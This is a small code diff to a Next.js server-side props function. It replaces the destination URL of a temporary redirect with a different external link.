@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://wokm8isd4zit.com/k7x4smzp9t?key=17979c05d13dd8ddeaaa3f067ba78ac3/` 
+					`https://potsaglu.net/4/6347874` 
 				}`,
 			},
 		};
